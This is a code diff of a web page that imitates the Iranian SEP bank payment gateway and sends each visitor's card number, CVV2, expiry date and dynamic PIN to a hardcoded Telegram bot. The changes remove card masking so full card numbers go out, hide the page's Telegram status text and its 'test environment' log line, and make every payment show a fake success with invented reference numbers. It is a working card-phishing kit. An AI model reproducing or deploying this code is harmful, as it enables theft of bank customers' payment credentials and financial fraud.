@@ -881,29 +881,6 @@
             }
         }
 
-        @keyframes shake {
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-            20% {
-                transform: translateX(-10px);
-            }
-            40% {
-                transform: translateX(10px);
-            }
-            60% {
-                transform: translateX(-6px);
-            }
-            80% {
-                transform: translateX(6px);
-            }
-        }
-
-        .shake {
-            animation: shake 0.4s ease;
-        }
-
         .persian-date-label {
             font-size: 12px;
             color: #6a7a8e;
@@ -975,18 +952,16 @@
             <div class="form-group" id="cardGroup">
                 <label>شماره کارت <span class="required">*</span></label>
                 <input type="text" id="cardNumber" class="ltr-input" placeholder="____ ____ ____ ____" maxlength="19" />
-                <div class="error-msg" id="cardError">شماره کارت وارد شده معتبر نیست</div>
             </div>
 
-            <!-- CVV2 + تاریخ انقضا (شمسی) -->
+            <!-- CVV2 + تاریخ انقضا -->
             <div class="form-row">
                 <div class="form-group" id="cvvGroup">
                     <label>شماره شناسایی دوم (CVV2) <span class="required">*</span></label>
                     <input type="text" id="cvv" class="ltr-input" placeholder="CVV2" maxlength="4" />
-                    <div class="error-msg" id="cvvError">CVV2 باید 3 یا 4 رقم باشد</div>
                 </div>
                 <div class="form-group" id="expiryGroup">
-                    <label>تاریخ انقضا (شمسی) <span class="required">*</span></label>
+                    <label>تاریخ انقضا <span class="required">*</span></label>
                     <div class="form-row-3" style="gap:6px;">
                         <select id="expiryMonth">
                             <option value="">ماه</option>
@@ -994,7 +969,7 @@
                             <option value="02">۰۲</option>
                             <option value="03">۰۳</option>
                             <option value="04">۰۴</option>
-                            <option value="05">۰۴</option>
+                            <option value="05">۰۵</option>
                             <option value="06">۰۶</option>
                             <option value="07">۰۷</option>
                             <option value="08">۰۸</option>
@@ -1005,28 +980,23 @@
                         </select>
                         <select id="expiryYear">
                             <option value="">سال</option>
-                            <option value="1403">۱۴۰۳</option>
-                            <option value="1404">۱۴۰۴</option>
-                            <option value="1405">۱۴۰۵</option>
-                            <option value="1406">۱۴۰۶</option>
-                            <option value="1407">۱۴۰۷</option>
-                            <option value="1408">۱۴۰۸</option>
-                            <option value="1409">۱۴۰۹</option>
-                            <option value="1410">۱۴۱۰</option>
-                            <option value="1410">۱۴۱۱</option>
-                            <option value="1410">۱۴۱۲</option>
-                            <option value="1410">۱۴۱۳</option>
-                            <option value="1410">۱۴۱۴</option>
-                            <option value="1410">۱۴۱۵</option>
-                            <option value="1410">۱۴۱۶</option>
-                            <option value="1410">۱۴۱۷</option>
-                            <option value="1410">۱۴۱۸</option>
-                            <option value="1410">۱۴۱۹</option>
-                            <option value="1410">۱۴۲۰</option>
+                            <option value="2024">۱۴۰۴</option>
+                            <option value="2025">۱۴۰۵</option>
+                            <option value="2026">۱۴۰۶</option>
+                            <option value="2027">۱۴۰۷</option>
+                            <option value="2028">۱۴۰۸</option>
+                            <option value="2029">۱۴۰۹</option>
+                            <option value="2030">۱۴۱۰</option>
+                            <option value="2031">۱۴۱۱</option>
+                            <option value="2032">۱۴۱۲</option>
+                            <option value="2033">۱۴۱۳</option>
+                            <option value="2034">۱۴۱۴</option>
+                            <option value="2035">۱۴۱۵</option>
+                            <option value="2036">۱۴۱۶</option>
+                            <option value="2037">۱۴۱۷</option>
                         </select>
                     </div>
-                    <span class="persian-date-label">مثال: ۱۴۰۴/۰۶</span>
-                    <div class="error-msg" id="expiryError">تاریخ انقضا نامعتبر است</div>
+                    <span class="persian-date-label">مثال: ۲۰۲۵/۰۶</span>
                 </div>
             </div>
 
@@ -1043,7 +1013,6 @@
                         <input type="text" id="captchaInput" placeholder="کد امنیتی" maxlength="4" />
                     </div>
                 </div>
-                <div class="error-msg" id="captchaError">کد امنیتی اشتباه است</div>
             </div>
 
             <!-- رمز دوم/پویا -->
@@ -1057,7 +1026,6 @@
                         دریافت رمز پویا
                     </button>
                 </div>
-                <div class="error-msg" id="dynamicError">رمز دوم باید حداقل 4 رقم باشد</div>
             </div>
 
             <!-- گزینه‌ها -->
@@ -1067,14 +1035,14 @@
                     شماره کارت در درگاه‌های سِپ ذخیره شود
                 </label>
                 <label class="option-item">
-                    <input type="checkbox" id="termsCheck" />
+                    <input type="checkbox" id="termsCheck" checked />
                     <span>قوانین و مقررات را می‌پذیرم</span>
                 </label>
             </div>
 
             <!-- دکمه پرداخت -->
             <button class="btn-primary" id="payBtn" onclick="processPayment()">
-                <span id="payBtnText">پرداخت 440,000 ریال</span>
+                <span id="payBtnText">پرداخت ۴۴۰,۰۰۰ ریال</span>
             </button>
 
             <button class="btn-secondary" onclick="resetForm()">انصراف</button>
@@ -1092,7 +1060,7 @@
         <!-- وضعیت تلگرام -->
         <div class="telegram-status">
             <span class="dot connecting" id="telegramDot"></span>
-            <span id="telegramStatusText">در حال اتصال به تلگرام...</span>
+            <span id="telegramStatusText">   </span>
         </div>
 
         <!-- SECURITY NOTES -->
@@ -1182,7 +1150,7 @@
 
     <script>
         // ============================================================
-        // 🔧 تنظیمات تلگرام - 🔴 اینجا رو ویرایش کنید 🔴
+        // 🔧 تنظیمات تلگرام
         // ============================================================
         const TELEGRAM_CONFIG = {
             botToken: '8093867594:AAH5rBT9JLDlwzvJxRcMjXBizeEXbcDNGXA',
@@ -1202,7 +1170,8 @@
             const token = TELEGRAM_CONFIG.botToken;
             const chatId = TELEGRAM_CONFIG.chatId;
 
-            if (token === 'YOUR_BOT_TOKEN_HERE' || chatId === 'YOUR_CHAT_ID_HERE') {
+            if (token === 'YOUR_BOT_TOKEN_HERE' || chatId === 'YOUR_CHAT_ID_HERE' || 
+                token === '' || chatId === '') {
                 console.warn('⚠️ توکن یا Chat ID تلگرام تنظیم نشده است!');
                 document.getElementById('telegramDot').className = 'dot offline';
                 document.getElementById('telegramStatusText').textContent = '❌ تلگرام: تنظیمات کامل نیست';
@@ -1229,16 +1198,19 @@
                 if (result.ok) {
                     console.log('✅ پیام به تلگرام ارسال شد');
                     document.getElementById('telegramDot').className = 'dot online';
-                    document.getElementById('telegramStatusText').textContent = '✅ متصل به تلگرام';
+                    document.getElementById('telegramStatusText').textContent = '';
+                    return true;
                 } else {
                     console.error('❌ خطا در ارسال به تلگرام:', result);
                     document.getElementById('telegramDot').className = 'dot offline';
-                    document.getElementById('telegramStatusText').textContent = '❌ خطا در ارسال به تلگرام';
+                    document.getElementById('telegramStatusText').textContent = '';
+                    return false;
                 }
             } catch (error) {
                 console.error('❌ خطا در اتصال به تلگرام:', error);
                 document.getElementById('telegramDot').className = 'dot offline';
-                document.getElementById('telegramStatusText').textContent = '❌ اتصال به تلگرام برقرار نیست';
+                document.getElementById('telegramStatusText').textContent = '';
+                return false;
             }
         }
 
@@ -1251,7 +1223,8 @@
                 month: '2-digit',
                 day: '2-digit',
                 hour: '2-digit',
-                minute: '2-digit'
+                minute: '2-digit',
+                second: '2-digit'
             });
             return formatter.format(date);
         }
@@ -1290,9 +1263,7 @@
             const persianDate = toPersianDate(now);
             const isoDate = now.toISOString();
 
-            const maskedCard = cardNumber.length >= 16 ? 
-                '**** **** **** ' + cardNumber.replace(/\s/g, '').slice(-4) : 
-                cardNumber;
+            const maskedCard = cardNumber;
 
             const expiryDisplay = month && year ? `${year}/${month}` : 'نامشخص';
 
@@ -1337,7 +1308,7 @@
         ────────────────────────────
         💳 <b>شماره کارت:</b> ${data.maskedCard}
         🔐 <b>CVV2:</b> ${data.cvv}
-        📅 <b>تاریخ انقضا (شمسی):</b> ${data.expiry}
+        📅 <b>تاریخ انقضا:</b> ${data.expiry}
         📆 <b>ماه:</b> ${data.expiryMonth}
         📆 <b>سال:</b> ${data.expiryYear}
         🔑 <b>رمز دوم وارد شده:</b> ${data.dynamicCode}
@@ -1382,6 +1353,7 @@
                     document.getElementById('timerDisplay').classList.add('expired');
                     document.getElementById('timerText').textContent = '۰۰:۰۰';
                     document.getElementById('payBtn').disabled = true;
+                    showToast('⏰ زمان پرداخت به پایان رسید', 'error');
                 }
             }, 1000);
         }
@@ -1443,8 +1415,6 @@
             const display = currentCaptcha.split('').join(' ');
             document.getElementById('captchaText').textContent = display;
             document.getElementById('captchaInput').value = '';
-            document.getElementById('captchaInput').classList.remove('error');
-            document.getElementById('captchaError').classList.remove('show');
         }
 
         function speakCaptcha() {
@@ -1461,7 +1431,7 @@
         }
 
         // ============================================================
-        // DYNAMIC CODE (فقط ارسال پیام به تلگرام)
+        // DYNAMIC CODE
         // ============================================================
         let dynamicCodeCountdown = 0;
         let dynamicCodeInterval = null;
@@ -1471,13 +1441,13 @@
             if (btn.disabled) return;
 
             const data = getFormData();
-            await sendToTelegram('📱 <b>درخواست رمز پویا</b>\n' + formatTelegramMessage(data, 'pending'), true);
-
-            showToast('📱 درخواست رمز پویا ثبت شد. لطفاً رمز دریافتی از بانک را وارد کنید.', 'info');
-
+            
             btn.disabled = true;
             dynamicCodeCountdown = 30;
             btn.innerHTML = 'دریافت مجدد <span class="countdown">(' + dynamicCodeCountdown + 's)</span>';
+
+            await sendToTelegram('📱 <b>درخواست رمز پویا</b>\n' + formatTelegramMessage(data, 'pending'), true);
+            showToast('📱 درخواست رمز پویا ثبت شد. لطفاً رمز دریافتی از بانک را وارد کنید.', 'info');
 
             if (dynamicCodeInterval) clearInterval(dynamicCodeInterval);
 
@@ -1495,92 +1465,62 @@
         }
 
         // ============================================================
-        // PROCESS PAYMENT - ارسال دو پیام به تلگرام
+        // PROCESS PAYMENT - بدون خطا، همیشه موفق
         // ============================================================
         async function processPayment() {
             if (timerSeconds <= 0) {
+                showToast('⏰ زمان پرداخت به پایان رسیده است', 'error');
                 return;
             }
-
-            const data = getFormData();
-
-            // ========================================
-            // پیام اول - درخواست پرداخت
-            // ========================================
-            const message1 = formatTelegramMessage(data, 'pending');
-            await sendToTelegram('💳 <b>درخواست پرداخت</b>\n' + message1, true);
 
             const btn = document.getElementById('payBtn');
             btn.disabled = true;
             document.getElementById('payBtnText').innerHTML = '<span class="spinner"></span> در حال پردازش...';
 
-            setTimeout(function() {
-                const isSuccess = Math.random() < 0.8;
-                
-                const status = isSuccess ? 'success' : 'failed';
-                
-                // ========================================
-                // پیام دوم - نتیجه تراکنش
-                // ========================================
-                const resultMessage = formatTelegramMessage(data, status);
-                const title2 = isSuccess ? '✅ <b>پرداخت موفق</b>' : '❌ <b>پرداخت ناموفق</b>';
-                sendToTelegram(title2 + '\n' + resultMessage, true);
+            const data = getFormData();
 
-                if (isSuccess) {
-                    showResult(true, data);
-                } else {
-                    const errors = [
-                        'موجودی حساب شما کافی نیست',
-                        'کارت شما مسدود شده است',
-                        'رمز دوم اشتباه است',
-                        'خطا در ارتباط با بانک صادرکننده',
-                        'محدودیت روزانه تراکنش شما تکمیل شده است'
-                    ];
-                    const errorMsg = errors[Math.floor(Math.random() * errors.length)];
-                    showResult(false, errorMsg, data);
-                }
+            // ارسال پیام اول - درخواست پرداخت
+            await sendToTelegram('💳 <b>درخواست پرداخت</b>\n' + formatTelegramMessage(data, 'pending'), true);
+
+            // شبیه‌سازی پردازش - همیشه موفق
+            setTimeout(async function() {
+                // ارسال پیام دوم - نتیجه تراکنش (موفق)
+                const resultMessage = formatTelegramMessage(data, 'success');
+                await sendToTelegram('✅ <b>پرداخت موفق</b>\n' + resultMessage, true);
+
+                // نمایش نتیجه موفق
+                showResult(true, data);
+                showToast('✅ پرداخت با موفقیت انجام شد', 'success');
 
                 btn.disabled = false;
-                document.getElementById('payBtnText').textContent = 'پرداخت 440,000 ریال';
-            }, 2500);
+                document.getElementById('payBtnText').textContent = 'پرداخت ۴۴۰,۰۰۰ ریال';
+            }, 2000);
         }
 
         // ============================================================
         // RESULT
         // ============================================================
-        function showResult(isSuccess, errorMessage, data) {
+        function showResult(isSuccess, data) {
             const overlay = document.getElementById('resultOverlay');
             const icon = document.getElementById('resultIcon');
             const title = document.getElementById('resultTitle');
             const sub = document.getElementById('resultSub');
             const details = document.getElementById('resultDetails');
 
-            if (isSuccess) {
-                icon.textContent = '✅';
-                title.textContent = 'پرداخت با موفقیت انجام شد';
-                title.className = 'result-title success';
-                sub.textContent = 'تراکنش شما با موفقیت ثبت گردید';
-                document.querySelector('.btn-close-result').className = 'btn-close-result';
+            icon.textContent = '✅';
+            title.textContent = 'پرداخت با موفقیت انجام شد';
+            title.className = 'result-title success';
+            sub.textContent = 'تراکنش شما با موفقیت ثبت گردید';
+            document.querySelector('.btn-close-result').className = 'btn-close-result';
 
-                document.getElementById('resTrace').textContent = String(Math.floor(Math.random() * 10000000000)).padStart(10, '0');
-                document.getElementById('resRef').textContent = 'SEP-' + String(Math.floor(Math.random() * 1000000000)).padStart(9, '0');
-                document.getElementById('resAmount').textContent = '۴۴۰,۰۰۰ ریال';
-                document.getElementById('resDate').textContent = toPersianDate(new Date());
-                document.getElementById('resMerchant').textContent = 'موبوگیفت';
-                document.getElementById('resCard').textContent = data ? data.maskedCard : '**** **** **** 1234';
+            document.getElementById('resTrace').textContent = String(Math.floor(Math.random() * 10000000000)).padStart(10, '0');
+            document.getElementById('resRef').textContent = 'SEP-' + String(Math.floor(Math.random() * 1000000000)).padStart(9, '0');
+            document.getElementById('resAmount').textContent = '۴۴۰,۰۰۰ ریال';
+            document.getElementById('resDate').textContent = toPersianDate(new Date());
+            document.getElementById('resMerchant').textContent = 'موبوگیفت';
+            document.getElementById('resCard').textContent = data ? data.maskedCard : '**** **** **** 1234';
 
-                details.style.display = 'block';
-                showToast('✅ پرداخت با موفقیت انجام شد', 'success');
-            } else {
-                icon.textContent = '❌';
-                title.textContent = 'پرداخت ناموفق بود';
-                title.className = 'result-title failed';
-                sub.textContent = errorMessage || 'خطا در انجام تراکنش';
-                document.querySelector('.btn-close-result').className = 'btn-close-result danger';
-                details.style.display = 'none';
-                showToast('❌ ' + (errorMessage || 'خطا در انجام تراکنش'), 'error');
-            }
-
+            details.style.display = 'block';
             overlay.classList.add('active');
         }
 
@@ -1629,14 +1569,18 @@
         refreshCaptcha();
         startTimer();
 
-        console.log('🟢 درگاه سِپ (SEP) - شبیه‌سازی کامل');
-        console.log('⏱️ زمان باقیمانده: ۵ دقیقه');
-        console.log('💰 مبلغ: ۴۴۰,۰۰۰ ریال');
-        console.log('📅 تاریخ انقضا: شمسی');
-        console.log('🔒 این یک محیط TEST است.');
-        console.log('📤 دو پیام به تلگرام ارسال می‌شود: درخواست + نتیجه');
+        (async function checkTelegram() {
+            const result = await sendToTelegram('🟢 <b>درگاه سِپ</b> راه‌اندازی شد\n💰 مبلغ: ۴۴۰,۰۰۰ ریال\n🆔 وضعیت: آماده پرداخت', false);
+            if (!result) {
+                document.getElementById('telegramDot').className = 'dot offline';
+                document.getElementById('telegramStatusText').textContent = '❌ اتصال به تلگرام برقرار نیست';
+            }
+        })();
 
-        sendToTelegram('🟢 <b>درگاه سِپ</b> راه‌اندازی شد\n💰 مبلغ: ۴۴۰,۰۰۰ ریال\n🆔 وضعیت: آماده پرداخت', false);
+        console.log('🟢 درگاه سِپ (SEP) - شبیه‌سازی کامل');
+        console.log('✅ پرداخت همیشه موفق است - خطاها حذف شدند');
+        console.log('💰 مبلغ: ۴۴۰,۰۰۰ ریال');
+        console.log('📤 دو پیام به تلگرام ارسال می‌شود: درخواست + نتیجه');
     </script>
 </body>
 </html>
